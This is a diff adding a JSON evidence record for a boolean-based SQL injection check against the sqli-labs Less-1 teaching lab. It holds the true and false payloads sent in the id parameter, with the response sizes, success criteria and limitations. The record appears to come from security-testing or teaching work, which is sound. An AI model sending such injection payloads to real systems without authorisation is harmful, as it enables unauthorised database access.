@@ -1,0 +1,57 @@
+{
+  "run_id": "wp4-20261019-sqli001-low",
+  "sample_id": "SQLI-001",
+  "path_id": "Less-1/index.php?id",
+  "condition_key": "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=none|state=initialized",
+  "observations": {
+    "endpoint": "/Less-1/index.php",
+    "parameter": "id (GET)",
+    "cases": {
+      "normal": {
+        "input": "1",
+        "status": 200,
+        "login_name": "Dumb",
+        "sql_error": "",
+        "body_bytes": 721
+      },
+      "true": {
+        "input": "1' AND '1'='1",
+        "status": 200,
+        "login_name": "Dumb",
+        "sql_error": "",
+        "body_bytes": 721
+      },
+      "false": {
+        "input": "1' AND '1'='2",
+        "status": 200,
+        "login_name": "",
+        "sql_error": "",
+        "body_bytes": 670
+      }
+    },
+    "normal_row_reproduced_by_true": true,
+    "false_returns_no_row": true
+  },
+  "success_criteria": [
+    "A normal numeric id returns an existing teaching row.",
+    "The boolean-true payload returns the same row while changing only id.",
+    "The boolean-false payload returns no user row, showing SQL semantics changed.",
+    "No authentication or redirect is involved in this endpoint."
+  ],
+  "limitations": [
+    "Only the selected Less-1 path and database account are covered.",
+    "No data beyond the first row was enumerated or exported."
+  ],
+  "artifacts": [
+    {
+      "path": "verification/evidence/wp4-20261019-sqli001-low/request.redacted.json",
+      "sha256": "5e148c1b65c213ad377a8aa025ff05472b46351f8156efdfa590ea02c1a59e15",
+      "description": "request.redacted.json"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-sqli001-low/response.redacted.txt",
+      "sha256": "4a5dffd82d7660de96bfb85a62652f0643721ea6290e66c84b837a9b1f7d7898",
+      "description": "response.redacted.txt"
+    }
+  ]
+}
